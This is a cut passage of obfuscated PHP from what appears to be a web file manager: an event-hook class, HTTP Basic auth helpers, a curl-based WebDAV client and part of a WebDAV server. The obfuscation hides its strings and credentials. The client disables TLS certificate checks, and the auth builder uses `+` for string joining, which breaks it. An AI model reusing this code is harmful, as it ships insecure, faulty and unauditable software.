$c…ø–…İÌ¹, $Céé¸ÌÆÅÚ) { $AĞ øŒ…²Ğ =& $_SERVER[¼]; $bº²¡ÁåŸÉ = $AĞ øŒ…²Ğ[1516]; switch ($E¸Ñ§²‰) { case $AĞ øŒ…²Ğ[1601]: $c…ø–…İÌ¹ = $c…ø–…İÌ¹ == $AĞ øŒ…²Ğ[83] ? $AĞ øŒ…²Ğ[1602] : $AĞ øŒ…²Ğ[1603]; break; case $AĞ øŒ…²Ğ[1604]: $c…ø–…İÌ¹ = $c…ø–…İÌ¹ ? $c…ø–…İÌ¹ : null; break; default: break; } switch ($Céé¸ÌÆÅÚ) { case $AĞ øŒ…²Ğ[1605]: $c…ø–…İÌ¹ = round($c…ø–…İÌ¹, 2); break; case $AĞ øŒ…²Ğ[184]: case $AĞ øŒ…²Ğ[107]: if ($c…ø–…İÌ¹ < 0) { $c…ø–…İÌ¹ = null; } else { if (is_numeric($c…ø–…İÌ¹)) { $c…ø–…İÌ¹ = date($bº²¡ÁåŸÉ, $c…ø–…İÌ¹); } } break; default: break; } return $c…ø–…İÌ¹; } private static function fileTypeArray() { $BÉ±¸Ìâà =& $_SERVER[¼]; return array($BÉ±¸Ìâà[1578] => array($BÉ±¸Ìâà[157] => $BÉ±¸Ìâà[1606] . $BÉ±¸Ìâà[1607], $BÉ±¸Ìâà[1582] => array($BÉ±¸Ìâà[1499] => $BÉ±¸Ìâà[1608], $BÉ±¸Ìâà[1501] => $BÉ±¸Ìâà[1609], $BÉ±¸Ìâà[1610] => $BÉ±¸Ìâà[1611], $BÉ±¸Ìâà[1612] => $BÉ±¸Ìâà[1613], $BÉ±¸Ìâà[184] => $BÉ±¸Ìâà[1614], $BÉ±¸Ìâà[107] => $BÉ±¸Ìâà[1615], $BÉ±¸Ìâà[1616] => $BÉ±¸Ìâà[1617], $BÉ±¸Ìâà[1618] => $BÉ±¸Ìâà[1619], $BÉ±¸Ìâà[1620] => $BÉ±¸Ìâà[1621], $BÉ±¸Ìâà[1622] => $BÉ±¸Ìâà[1623], $BÉ±¸Ìâà[1624] => $BÉ±¸Ìâà[1625], $BÉ±¸Ìâà[1626] => $BÉ±¸Ìâà[1627], $BÉ±¸Ìâà[1628] => $BÉ±¸Ìâà[1629], $BÉ±¸Ìâà[1630] => array($BÉ±¸Ìâà[1631] => $BÉ±¸Ìâà[1632], $BÉ±¸Ìâà[1633] => $BÉ±¸Ìâà[1634], $BÉ±¸Ìâà[1635] => $BÉ±¸Ìâà[1636]), $BÉ±¸Ìâà[1637] => $BÉ±¸Ìâà[1638], $BÉ±¸Ìâà[1639] => $BÉ±¸Ìâà[1640], $BÉ±¸Ìâà[1641] => $BÉ±¸Ìâà[1642], $BÉ±¸Ìâà[1643] => $BÉ±¸Ìâà[1644], $BÉ±¸Ìâà[1645] => array($BÉ±¸Ìâà[1646] => $BÉ±¸Ìâà[1647], $BÉ±¸Ìâà[1648] => $BÉ±¸Ìâà[1649], $BÉ±¸Ìâà[1650] => $BÉ±¸Ìâà[1651], $BÉ±¸Ìâà[1652] => $BÉ±¸Ìâà[1653], $BÉ±¸Ìâà[1654] => $BÉ±¸Ìâà[1655], $BÉ±¸Ìâà[1656] => $BÉ±¸Ìâà[1657], $BÉ±¸Ìâà[1658] => $BÉ±¸Ìâà[1659], $BÉ±¸Ìâà[1660] => $BÉ±¸Ìâà[1661], $BÉ±¸Ìâà[1662] => $BÉ±¸Ìâà[1663], $BÉ±¸Ìâà[1664] => $BÉ±¸Ìâà[1665], $BÉ±¸Ìâà[1666] => $BÉ±¸Ìâà[1667]))), $BÉ±¸Ìâà[1668] => array($BÉ±¸Ìâà[157] => $BÉ±¸Ìâà[1669] . $BÉ±¸Ìâà[1670], $BÉ±¸Ìâà[1582] => array($BÉ±¸Ìâà[1586] => $BÉ±¸Ìâà[1671], $BÉ±¸Ìâà[184] => $BÉ±¸Ìâà[1672], $BÉ±¸Ìâà[107] => $BÉ±¸Ìâà[1673], $BÉ±¸Ìâà[1618] => $BÉ±¸Ìâà[1674], $BÉ±¸Ìâà[1675] => $BÉ±¸Ìâà[1676], $BÉ±¸Ìâà[1677] => $BÉ±¸Ìâà[1604], $BÉ±¸Ìâà[1678] => $BÉ±¸Ìâà[1679], $BÉ±¸Ìâà[1680] => $BÉ±¸Ìâà[1681], $BÉ±¸Ìâà[1682] => $BÉ±¸Ìâà[1683], $BÉ±¸Ìâà[1595] => array($BÉ±¸Ìâà[1312] => $BÉ±¸Ìâà[1684], $BÉ±¸Ìâà[1599] => $BÉ±¸Ìâà[1685], $BÉ±¸Ìâà[1600] => $BÉ±¸Ìâà[1686], $BÉ±¸Ìâà[1687] => $BÉ±¸Ìâà[1688], $BÉ±¸Ìâà[1689] => $BÉ±¸Ìâà[1690], $BÉ±¸Ìâà[1691] => $BÉ±¸Ìâà[1692], $BÉ±¸Ìâà[1578] => $BÉ±¸Ìâà[1693]))), $BÉ±¸Ìâà[1694] => array($BÉ±¸Ìâà[157] => $BÉ±¸Ìâà[1695] . $BÉ±¸Ìâà[1696], $BÉ±¸Ìâà[1582] => array($BÉ±¸Ìâà[1499] => $BÉ±¸Ìâà[1697], $BÉ±¸Ìâà[1501] => $BÉ±¸Ìâà[1698], $BÉ±¸Ìâà[1586] => $BÉ±¸Ìâà[1671], $BÉ±¸Ìâà[184] => $BÉ±¸Ìâà[1699], $BÉ±¸Ìâà[107] => $BÉ±¸Ìâà[1700], $BÉ±¸Ìâà[1605] => $BÉ±¸Ìâà[1701], $BÉ±¸Ìâà[1682] => $BÉ±¸Ìâà[1702], $BÉ±¸Ìâà[1678] => $BÉ±¸Ìâà[1703], $BÉ±¸Ìâà[1618] => $BÉ±¸Ìâà[1704], $BÉ±¸Ìâà[1668] => array($BÉ±¸Ìâà[1677] => $BÉ±¸Ìâà[1604], $BÉ±¸Ìâà[1705] => $BÉ±¸Ìâà[1706], $BÉ±¸Ìâà[1675] => $BÉ±¸Ìâà[1676], $BÉ±¸Ìâà[1682] => $BÉ±¸Ìâà[1683], $BÉ±¸Ìâà[1678] => $BÉ±¸Ìâà[1707], $BÉ±¸Ìâà[1680] => $BÉ±¸Ìâà[1681]))), $BÉ±¸Ìâà[1708] => array($BÉ±¸Ìâà[1582] => array($BÉ±¸Ìâà[1709] => $BÉ±¸Ìâà[1710], $BÉ±¸Ìâà[1711] => $BÉ±¸Ìâà[1712])), $BÉ±¸Ìâà[1713] => array($BÉ±¸Ìâà[1582] => array())); } } class Hook { private static $events = array(); public static function get($dæ°ê‚ÌçÃ = false) { if (!$dæ°ê‚ÌçÃ) { return self::$events; } else { return self::$events[$dæ°ê‚ÌçÃ]; } } public static function apply($BÂ‘›†¢»¤, $F¼¿’ÌËÜ¦ = array()) { $eƒó¾¶„—² = ActionApply($BÂ‘›†¢»¤, $F¼¿’ÌËÜ¦); if (is_string($BÂ‘›†¢»¤)) { Hook::trigger($BÂ‘›†¢»¤); } return $eƒó¾¶„—²; } public static function bind($c«ÚÛºçùÒ, $fòôÊ¶ã¹, $D¤¤éƒ¬î˜ = false) { $F›÷Öí‡ğ· =& $_SERVER[¼]; if (!isset(self::$events[$c«ÚÛºçùÒ])) { self::$events[$c«ÚÛºçùÒ] = array(); } self::$events[$c«ÚÛºçùÒ][] = array($F›÷Öí‡ğ·[1714] => $fòôÊ¶ã¹, $F›÷Öí‡ğ·[1715] => $D¤¤éƒ¬î˜, $F›÷Öí‡ğ·[1716] => 0); } public static function once($c”ãŸÕê¸¬, $F•ÉŠå¬³º) { self::bind($c”ãŸÕê¸¬, $F•ÉŠå¬³º, !0); } public static function unbind($cÎŠôùĞÜà, $fŠ½â‚ì = false) { if (!$fŠ½â‚ì) { self::$events[$cÎŠôùĞÜà] = array(); return; } $dÒÁŒ˜†½ß = self::$events[$cÎŠôùĞÜà]; self::$events[$cÎŠôùĞÜà] = array(); if (!is_array($dÒÁŒ˜†½ß)) { return; } for ($Aª¤ëÑ¯ = 0; $Aª¤ëÑ¯ < count($dÒÁŒ˜†½ß); $Aª¤ëÑ¯++) { if ($dÒÁŒ˜†½ß[$Aª¤ëÑ¯][$_SERVER[¼][1714]] == $fŠ½â‚ì) { continue; } self::$events[$cÎŠôùĞÜà][] = $dÒÁŒ˜†½ß[$Aª¤ëÑ¯]; } } public static function filter($D‹Ì¸‰”¿À, $dãÌ™ñ‹ïŒ) { goto fç¾ˆ³ ¨‹; Eàíô’§ñ™: for ($d¢’İäÄÍ£ = 0; $d¢’İäÄÍ£ < count($dßŒ§›µ’); $d¢’İäÄÍ£++) { $A¿ã“é = $dßŒ§›µ’[$d¢’İäÄÍ£]; if ($A¿ã“é[$Bß°ĞøÕš·[1715]] && $A¿ã“é[$Bß°ĞøÕš·[1716]] > 1) { continue; } self::$events[$D‹Ì¸‰”¿À][$d¢’İäÄÍ£][$Bß°ĞøÕš·[1716]] = $A¿ã“é[$Bß°ĞøÕš·[1716]] + 1; $B“Ö–…×Ê¬ = self::apply($A¿ã“é[$Bß°ĞøÕš·[1714]], array($f›§ŸöÄõ)); if (!is_null($B“Ö–…×Ê¬)) { $f›§ŸöÄõ = $B“Ö–…×Ê¬; } } return $f›§ŸöÄõ; goto FÙí²îñà»; AÓÓò˜¢…: $dßŒ§›µ’ = $aÃ¼­¯˜Ş[$D‹Ì¸‰”¿À]; $f›§ŸöÄõ = $dãÌ™ñ‹ïŒ; if (!is_array($dßŒ§›µ’) || count($dßŒ§›µ’) == 0) { return $f›§ŸöÄõ; } goto Eàíô’§ñ™; fç¾ˆ³ ¨‹: $Bß°ĞøÕš· =& $_SERVER[¼]; $aÃ¼­¯˜Ş = self::$events; if (!isset($aÃ¼­¯˜Ş[$D‹Ì¸‰”¿À])) { return $dãÌ™ñ‹ïŒ; } goto AÓÓò˜¢…; FÙí²îñà»: } public static function trigger($Cİ‘íÎÒ) { goto dèÊĞó©ç; a–¡äÆõ²ä: $F«Š°‘‰’Ù = func_get_args(); array_shift($F«Š°‘‰’Ù); for ($eÜ’…áË = 0; $eÜ’…áË < count($fĞŠà¡­’Œ); $eÜ’…áË++) { $aŒÅÔ‡åù = $fĞŠà¡­’Œ[$eÜ’…áË]; if ($aŒÅÔ‡åù[$a”–ÜœäŒ[1715]] && $aŒÅÔ‡åù[$a”–ÜœäŒ[1716]] > 1) { continue; } if (defined($a”–ÜœäŒ[1717]) && GLOBAL_LOG_HOOK) { write_log($Cİ‘íÎÒ . $a”–ÜœäŒ[1718] . $aŒÅÔ‡åù[$a”–ÜœäŒ[1714]], $a”–ÜœäŒ[1719]); } self::$events[$Cİ‘íÎÒ][$eÜ’…áË][$a”–ÜœäŒ[1716]] = $aŒÅÔ‡åù[$a”–ÜœäŒ[1716]] + 1; $cšÃ ¢Ùä÷ = self::apply($aŒÅÔ‡åù[$a”–ÜœäŒ[1714]], $F«Š°‘‰’Ù); if (defined($a”–ÜœäŒ[1717]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $a”–ÜœäŒ[1719]); if ($aŒÅÔ‡åù[$a”–ÜœäŒ[1716]] == 200) { $Cƒó®Âóµ = is_array($aŒÅÔ‡åù[$a”–ÜœäŒ[1714]]) ? json_encode_force($aŒÅÔ‡åù[$a”–ÜœäŒ[1714]]) : $aŒÅÔ‡åù[$a”–ÜœäŒ[1714]]; write_log($a”–ÜœäŒ[1720] . $Cİ‘íÎÒ . $a”–ÜœäŒ[1721] . $Cƒó®Âóµ, $a”–ÜœäŒ[1722]); } } $bù©Û²İ‘ = is_null($cšÃ ¢Ùä÷) ? $bù©Û²İ‘ : $cšÃ ¢Ùä÷; } goto e·”¨¿ªË; e·”¨¿ªË: return $bù©Û²İ‘; goto Cš³ËÑêÍ²; Aá´Ü•’­: if (!isset($fèÓÍ‰Üˆõ[$Cİ‘íÎÒ])) { return $bù©Û²İ‘; } $fĞŠà¡­’Œ = $fèÓÍ‰Üˆõ[$Cİ‘íÎÒ]; if (!is_array($fĞŠà¡­’Œ) || count($fĞŠà¡­’Œ) == 0) { return $bù©Û²İ‘; } goto a–¡äÆõ²ä; dèÊĞó©ç: $a”–ÜœäŒ =& $_SERVER[¼]; $fèÓÍ‰Üˆõ = self::$events; $bù©Û²İ‘ = !1; goto Aá´Ü•’­; Cš³ËÑêÍ²: } } goto DË·Ñ¶¼º; DË·Ñ¶¼º: class HttpAuth { public static function get() { $f·»êœ±·Ê =& $_SERVER[¼]; $c•ò¥Şñ¡… = $f·»êœ±·Ê[33]; $F½§‘¤¦´ = $f·»êœ±·Ê[33]; if (isset($_SERVER[$f·»êœ±·Ê[1723]])) { $c•ò¥Şñ¡… = $_SERVER[$f·»êœ±·Ê[1723]]; $F½§‘¤¦´ = $_SERVER[$f·»êœ±·Ê[1724]]; } elseif (isset($_SERVER[$f·»êœ±·Ê[1725]])) { $f×Û˜’º = $_SERVER[$f·»êœ±·Ê[1725]]; if (strpos(strtolower($f×Û˜’º), $f·»êœ±·Ê[1726]) === 0) { $B•ƒ¶¢ó†õ = explode($f·»êœ±·Ê[4], base64_decode(substr($f×Û˜’º, 6))); $c•ò¥Şñ¡… = isset($B•ƒ¶¢ó†õ[0]) ? $B•ƒ¶¢ó†õ[0] : $f·»êœ±·Ê[33]; $F½§‘¤¦´ = isset($B•ƒ¶¢ó†õ[1]) ? $B•ƒ¶¢ó†õ[1] : 0; } } return array($f·»êœ±·Ê[531] => $c•ò¥Şñ¡…, $f·»êœ±·Ê[892] => $F½§‘¤¦´); } public static function error() { goto C×å‹§ğ™; aòªÛ²øÎ: die; goto C•Ş½İ³İ; C×å‹§ğ™: $bö—°õö¯ =& $_SERVER[¼]; header($bö—°õö¯[1727]); header($bö—°õö¯[1728]); goto F…ÔàÈÄ‡; F…ÔàÈÄ‡: header($bö—°õö¯[1729]); header($bö—°õö¯[1730]); header($bö—°õö¯[1248]); goto aòªÛ²øÎ; C•Ş½İ³İ: } public static function make($b•ºİ¸±³ë, $B”Äğï£†Û) { $f«¢ñ…¥Ü¯ =& $_SERVER[¼]; return $f«¢ñ…¥Ü¯[1731] + base64_encode($b•ºİ¸±³ë . $f«¢ñ…¥Ü¯[4] . $B”Äğï£†Û); } } class HttpDavClient { public function __construct($Açéæ„ »³, $AØˆĞ¯Ã†¡, $cÍÊŠ™•ºˆ) { $this->header = array(); $this->userName = $AØˆĞ¯Ã†¡; $this->userPassowrd = $cÍÊŠ™•ºˆ; } protected function makePath($DœØÂÚÚ¶˜) { return $DœØÂÚÚ¶˜; } protected function setHeader($EÎàù…¶Ş„, $fÔË„…–è = false) { if ($fÔË„…–è === !1) { $this->header[] = $EÎàù…¶Ş„; } else { $this->header[] = $EÎàù…¶Ş„ . $_SERVER[¼][875] . $fÔË„…–è; } } public function move($CÈ¿èªî¾, $F³Ş‡Áò†, $CœøÇĞí” = '') { $EÁìÎ¿Ê¹  =& $_SERVER[¼]; $this->setHeader($EÁìÎ¿Ê¹ [1732], $this->makePath($F³Ş‡Áò†)); $this->setHeader($EÁìÎ¿Ê¹ [1733], $EÁìÎ¿Ê¹ [1734]); if ($CœøÇĞí”) { $this->setHeader($EÁìÎ¿Ê¹ [1735], $EÁìÎ¿Ê¹ [920] . $CœøÇĞí” . $EÁìÎ¿Ê¹ [923]); } return $this->send($EÁìÎ¿Ê¹ [1736], $CÈ¿èªî¾); } public function copy($B½ÇøË²çˆ, $fù˜ ×‰¹Ü) { $d®å¹öÆ =& $_SERVER[¼]; $this->setHeader($d®å¹öÆ[1732], $this->makePath($fù˜ ×‰¹Ü)); $this->setHeader($d®å¹öÆ[1733], $d®å¹öÆ[1734]); return $this->send($d®å¹öÆ[1737], $B½ÇøË²çˆ); } public function mkcol($bß™Şå†¤£) { $f±â½êš™Ÿ =& $_SERVER[¼]; $this->setHeader($f±â½êš™Ÿ[1733], $f±â½êš™Ÿ[1734]); return $this->send($f±â½êš™Ÿ[1738], $bß™Şå†¤£); } public function delete($a—Š´Ñµ‹, $C‘Ğï­ç = '') { $D…¨˜çÆêª =& $_SERVER[¼]; if ($C‘Ğï­ç) { $this->setHeader($D…¨˜çÆêª[1735], $D…¨˜çÆêª[920] . $C‘Ğï­ç . $D…¨˜çÆêª[923]); } return $this->send($D…¨˜çÆêª[1236], $a—Š´Ñµ‹); } public function propfind($CŠÒÓã„ò) { $DÆÊêŠ¾öÒ =& $_SERVER[¼]; $this->setHeader($DÆÊêŠ¾öÒ[1739], $DÆÊêŠ¾öÒ[83]); $this->setHeader($DÆÊêŠ¾öÒ[1740], $DÆÊêŠ¾öÒ[1741]); $f›¼š“ßâ‘ = $DÆÊêŠ¾öÒ[1742]; return $this->send($DÆÊêŠ¾öÒ[1743], $CŠÒÓã„ò, $f›¼š“ßâ‘); } public function options($BÃç×¶Õø) { return $this->send($_SERVER[¼][1744], $BÃç×¶Õø); } public function get($Aôö»¥Èí») { return $this->send($_SERVER[¼][213], $Aôö»¥Èí»); } public function put($EÚóÈ›ÕŒ, $cÑ•ÀŠ££±, $D¦Ñİß¹Œ = '') { $BÔ›‰¬Á²‹ =& $_SERVER[¼]; if ($D¦Ñİß¹Œ) { $this->setHeader($BÔ›‰¬Á²‹[1735], $BÔ›‰¬Á²‹[920] . $D¦Ñİß¹Œ . $BÔ›‰¬Á²‹[923]); } return $this->send($BÔ›‰¬Á²‹[211], $EÚóÈ›ÕŒ, $cÑ•ÀŠ££±); } protected function send($cô­Ä‚¸ç­, $f»ª¨ÉÀŠÉ, $AÙ¢ãİ‹¥ = false, $Dô©š‡¿åä = false) { goto DÑÓº…¡Ê; b…±É§¾Î: curl_setopt($bÅğœíá­ , CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($bÅğœíá­ , CURLOPT_SSL_VERIFYHOST, !1); $dÉ»…¼·ø¿ = curl_exec($bÅğœíá­ ); goto Eé•íÎÂ›; Eé•íÎÂ›: $this->header = array(); return $dÉ»…¼·ø¿; goto bœâÓ„ƒŠ; DÑÓº…¡Ê: $C”…“¢Ğ› =& $_SERVER[¼]; $CİËµ˜Ø = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($C”…“¢Ğ›[1745], $C”…“¢Ğ›[50]); goto E„ÒŠµ§õÖ; bÌƒÎà…é¿: curl_setopt($bÅğœíá­ , CURLOPT_HTTPHEADER, $this->header); curl_setopt($bÅğœíá­ , CURLOPT_RETURNTRANSFER, !0); curl_setopt($bÅğœíá­ , CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto b…±É§¾Î; AÃ‘‹‰ùª©: $bÅğœíá­  = curl_init($f»ª¨ÉÀŠÉ); curl_setopt($bÅğœíá­ , CURLOPT_CUSTOMREQUEST, $cô­Ä‚¸ç­); curl_setopt($bÅğœíá­ , CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto bÌƒÎà…é¿; E„ÒŠµ§õÖ: $this->setHeader($CİËµ˜Ø); if ($AÙ¢ãİ‹¥) { $AÙ¢ãİ‹¥ = $C”…“¢Ğ›[1746] . $AÙ¢ãİ‹¥; } if (!request_url_safe($f»ª¨ÉÀŠÉ)) { return !1; } goto AÃ‘‹‰ùª©; bœâÓ„ƒŠ: } } class HttpDavServer { public function __construct($B‚ÌÛˆğˆ, $AèÙ„¢†ÄĞ) { $this->root = $B‚ÌÛˆğˆ; $this->initPath($AèÙ„¢†ÄĞ); $this->start(); } public function initPath($E¥…½èâÏŠ) { $eÂÍãåÌ£‹ =& $_SERVER[¼]; $D¾ßš‚ÇŒ° = rtrim($_SERVER[$eÂÍãåÌ£‹[1355]], $eÂÍãåÌ£‹[8]) . $eÂÍãåÌ£‹[8]; $this->urlBase = substr($D¾ßš‚ÇŒ°, 0, strpos($D¾ßš‚ÇŒ°, $E¥…½èâÏŠ) + 1); $this->urlBase = rtrim($this->urlBase, $eÂÍãåÌ£‹[8]) . $E¥…½èâÏŠ; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $eÅ‘‚Ï†Ô§ =& $_SERVER[¼]; $Cƒˆä¾‘‹ = HttpAuth::get(); if ($Cƒˆä¾‘‹[$eÅ‘‚Ï†Ô§[531]] == $eÅ‘‚Ï†Ô§[1747] && $Cƒˆä¾‘‹[$eÅ‘‚Ï†Ô§[892]] == $eÅ‘‚Ï†Ô§[1748]) { return !0; } HttpAuth::error(); } public function start() { goto DïÜê„å£Â; B–Ì³ØÚìÑ: if (!method_exists($this, $cäÎ¬åÎÊ)) { pr($cäÎ¬åÎÊ . $bæ›Å‡œœè[1749]); die; } $cô‡¶ß‡ = array($bæ›Å‡œœè[1750], $bæ›Å‡œœè[1751]); if (!in_array($cäÎ¬åÎÊ, $cô‡¶ß‡) && !$this->pathExists($this->path)) { $E˜…¦¥˜í = array($bæ›Å‡œœè[1025] => 404); } else { $E˜…¦¥˜í = $this->{$cäÎ¬åÎÊ}(); } goto fä–Î¼¨„™; DïÜê„å£Â: $bæ›Å‡œœè =& $_SERVER[¼]; $this->checkUser(); $cäÎ¬åÎÊ = $bæ›Å‡œœè[143] . HttpHeader::method(); goto B–Ì³ØÚìÑ; fä–Î¼¨„™: if (!$E˜…¦¥˜í) { return; } self::response($E˜…¦¥˜í); goto BÓ·µÚè¤„; BÓ·µÚè¤„: } public function pathGet($cêğŠÒ“¿ = false) { $dùêø¥ÖÎ… =& $_SERVER[¼]; $AèÜ¼“ŞŸ = $cêğŠÒ“¿ ? $_SERVER[$dùêø¥ÖÎ…[1752]] : $_SERVER[$dùêø¥ÖÎ…[1355]]; $AèÜ¼“ŞŸ = KodIO::clear(rawurldecode($AèÜ¼“ŞŸ)); if (!strstr($AèÜ¼“ŞŸ, KodIO::clear($this->urlBase))) { return !1; } return substr($AèÜ¼“ŞŸ, strpos($AèÜ¼“ŞŸ, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($Aó®Õ¾¢î±) { return file_exists($Aó®Õ¾¢î±); } public function pathMkdir($EÈÏ‹ÀÊµÌ) { return mkdir($EÈÏ‹ÀÊµÌ, 511, !0); } public function pathInfo($CŒ»‡†™Ö) { return path_info($CŒ»‡†™Ö); } public function pathList($Cöêœ†¬Ç) { return path_list($Cöêœ†¬Ç); } public function pathOut($f£¿²ÀóÏ) { echo file_get_contents($f£¿²ÀóÏ); } public function pathPut($B¾çºÉºÃš, $b»”¶¾¼Û = '') { if (!$b»”¶¾¼Û) { return file_put_contents($B¾çºÉºÃš, $_SERVER[¼][33]); } return move_path($b»”¶¾¼Û, $B¾çºÉºÃš); } public function pathRemove($b…Ö‰ˆ¥¢ô) { if (is_file($b…Ö‰ˆ¥¢ô)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($c«™–ö¡¸, $díÖ›¹ëğ) { return move_path($c«™–ö¡¸, $díÖ›¹ëğ); } public function pathCopy($f¬Øç¤», $AîöÏî†Íº) { return copy_dir($f¬Øç¤», $AîöÏî†Íº); } public function parsePath($bÍ¸»öÌä¤) { return $bÍ¸»öÌä¤; } public function parseItem($B’ËÅ´åÀ…, $C•Áº¡ÃôÄ) { goto Eêæ•İ˜í¾; d„ë…Æª¨: $Eø¼Û¦—¼ğ = array($CÔƒï§Ä[1753] => KodIO::clear($this->urlBase . $DºáÔèâİ¨), $CÔƒï§Ä[107] => @gmdate($CÔƒï§Ä[1754], $B’ËÅ´åÀ…[$CÔƒï§Ä[107]]), $CÔƒï§Ä[184] => @gmdate($CÔƒï§Ä[1755], $B’ËÅ´åÀ…[$CÔƒï§Ä[184]]), $CÔƒï§Ä[77] => $B’ËÅ´åÀ…[$CÔƒï§Ä[77]] ? $B’ËÅ´åÀ…[$CÔƒï§Ä[77]] : 0); return $Eø¼Û¦—¼ğ; goto cÔ‰ÒÌ§‘; Ašé×ÔÛÏ: if ($C•Áº¡ÃôÄ) { $DºáÔèâİ¨ = $CÔƒï§Ä[8] . str_replace($CÔƒï§Ä[169], $CÔƒï§Ä[8], rawurlencode($this->pathGet())); } if (!trim($B’ËÅ´åÀ…[$CÔƒï§Ä[107]])) { $B’ËÅ´åÀ…[$CÔƒï§Ä[107]] = time(); } if (!trim($B’ËÅ´åÀ…[$CÔƒï§Ä[184]])) { $B’ËÅ´åÀ…[$CÔƒï§Ä[184]] = time(); } goto d„ë…Æª¨; Eêæ•İ˜í¾: $CÔƒï§Ä =& $_SERVER[¼]; $DºáÔèâİ¨ = $this->pathGet() . $CÔƒï§Ä[8] . $B’ËÅ´åÀ…[$CÔƒï§Ä[28]]; $DºáÔèâİ¨ = $CÔƒï§Ä[8] . str_replace($CÔƒï§Ä[169], $CÔƒï§Ä[8], rawurlencode($DºáÔèâİ¨)); goto Ašé×ÔÛÏ; cÔ‰ÒÌ§‘: } public function parseItemXml($e¡Çìµ‘µ‹, $aÀ‚¡§÷¹) { $cÔñŒ¼¦Û =& $_SERVER[¼]; $dã§ë«¦Ü° = $this->parseItem($e¡Çìµ‘µ‹, $aÀ‚¡§÷¹); if ($e¡Çìµ‘µ‹[$cÔñŒ¼¦Û[29]] == $cÔñŒ¼¦Û[76]) { $E»˜•µÎÜ = $cÔñŒ¼¦Û[1756]; $E»˜•µÎÜ .= $cÔñŒ¼¦Û[1757]; } else { $C¾§Áóºğß = $e¡Çìµ‘µ‹[$cÔñŒ¼¦Û[157]] ? $e¡Çìµ‘µ‹[$cÔñŒ¼¦Û[157]] : get_path_ext($e¡Çìµ‘µ‹[$cÔñŒ¼¦Û[28]]); $F´²‘ó½Î = get_file_mime($C¾§Áóºğß); $E»˜•µÎÜ = $cÔñŒ¼¦Û[1758]; $E»˜•µÎÜ .= "\x3c\x44\x3a\x67\x65\164\143\157\156\164\145\x6e\164\164\171\x70\145\76{$F´²‘ó½Î}\74\57\x44\72\x67\145\164\x63\x6f\x6e\x74\145\x6e\x74\x74\171\160\x65\76"; } return "\12\x9\11\x3c\104\72\162\x65\163\x70\x6f\156\x73\x65\76\xa\x9\11\x9\x3c\104\72\x68\x72\x65\146\x3e{$dã§ë«¦Ü°[$cÔñŒ¼¦Û[1753]]}\x3c\57\104\x3a\150\162\145\146\x3e\xa\x9\11\x9\74\104\x3a\x70\x72\157\x70\x73\x74\x61\164\76\12\11\x9\x9\x9\74\104\72\x70\162\157\x70\x3e\12\x9\x9\11\11\11\74\x44\72\x67\x65\x74\154\x61\x73\x74\155\157\144\x69\146\x69\x65\144\x3e{$dã§ë«¦Ü°[$cÔñŒ¼¦Û[107]]}\x3c\57\x44\72\x67\x65\x74\154\141\x73\x74\x6d\157\x64\151\x66\151\145\x64\76\12\11\11\11\11\x9\74\104\72\x63\162\x65\141\164\x69\157\x6e\x64\x61\164\145\x3e{$dã§ë«¦Ü°[$cÔñŒ¼¦Û[184]]}\x3c\x2f\104\x3a\x63\162\x65\x61\x74\x69\x6f\x6e\144\x61\x74\145\76\12\11\x9\x9\11\11\74\104\72\147\x65\x74\x63\x6f\156\164\x65\x6e\164\154\x65\156\x67\164\150\76{$dã§ë«¦Ü°[$cÔñŒ¼¦Û[77]]}\x3c\57\104\x3a\147\145\x74\x63\x6f\156\x74\x65\156\164\154\x65\156\x67\164\x68\x3e\xa\x9\11\11\11\11{$E»˜•µÎÜ}\12\11\11\11\x9\x3c\57\104\72\x70\162\157\x70\x3e\xa\11\x9\11\x9\x3c\104\x3a\163\164\x61\164\165\163\x3e\x48\124\x54\x50\57\61\56\61\40\62\x30\60\40\117\x4b\74\57\x44\72\x73\x74\141\164\x75\x73\x3e\12\x9\x9\x9\x3c\x2f\104\72\160\x72\157\x70\x73\x74\141\x74\76\xa\x9\x9\74\57\x44\x3a\x72\x65\163\x70\x6f\x6e\x73\x65\x3e"; } public function pathListMerge($E‡¡Í¶×÷…) { goto AäÌ«Ùî¿; AäÌ«Ùî¿: $f¤’³™¸ÉÄ =& $_SERVER[¼]; if (!$E‡¡Í¶×÷…) { return $E‡¡Í¶×÷…; } $EÎ³À·èô = array($f¤’³™¸ÉÄ[73], $f¤’³™¸ÉÄ[74], $f¤’³™¸ÉÄ[1759]); goto f‹‡Óùƒ”£; f‹‡Óùƒ”£: $bµ»áï¤Ø = array(); foreach ($E‡¡Í¶×÷… as $DğºÍÁ»µ => $E…îÅË¸Ù) { if (!in_array($DğºÍÁ»µ, $EÎ³À·èô) || !is_array($E…îÅË¸Ù)) { continue; } $bµ»áï¤Ø = array_merge($bµ»áï¤Ø, $E…îÅË¸Ù); } foreach ($bµ»áï¤Ø as &$F…§·‰¤’ª) { $F…§·‰¤’ª[$f¤’³™¸ÉÄ[28]] = str_replace($f¤’³™¸ÉÄ[8], $f¤’³™¸ÉÄ[1357], $F…§·‰¤’ª[$f¤’³™¸ÉÄ[28]]); } goto AĞ ®‹…°å; AĞ ®‹…°å: return $bµ»áï¤Ø; goto FƒÏ£‹©Ôñ; FƒÏ£‹©Ôñ: } public function httpPROPFIND() { goto A‚í‘êšÀî; CÁêè½Ÿ”ò: $BÇ³ßç”à– = $aôóÃ½ßÈ[$F‰ô‚„ãÔß[1760]]; if (!is_array($aÓƒÁ‘Ùº¤) || $BÇ³ßç”à–[$F‰ô‚„ãÔß[1761]] === !1) { return array($F‰ô‚„ãÔß[1762] => 404, $F‰ô‚„ãÔß[1763] => $F‰ô‚„ãÔß[1764]); } $EÈµƒÃ±— = $BÇ³ßç”à–[$F‰ô‚„ãÔß[29]] == $F‰ô‚„ãÔß[164] || HttpHeader::get($F‰ô‚„ãÔß[1739]) == $F‰ô‚„ãÔß[464]; goto Dˆ†¤½âø¯; A‚í‘êšÀî: $F‰ô‚„ãÔß =& $_SERVER[¼]; $aôóÃ½ßÈ = $this->pathList($this->path); $aÓƒÁ‘Ùº¤ = $this->pathListMerge($aôóÃ½ßÈ); goto CÁêè½Ÿ”ò; f±·‚ÉèÖğ: return array($F‰ô‚„ãÔß[1762] => 207, $F‰ô‚„ãÔß[1763] => 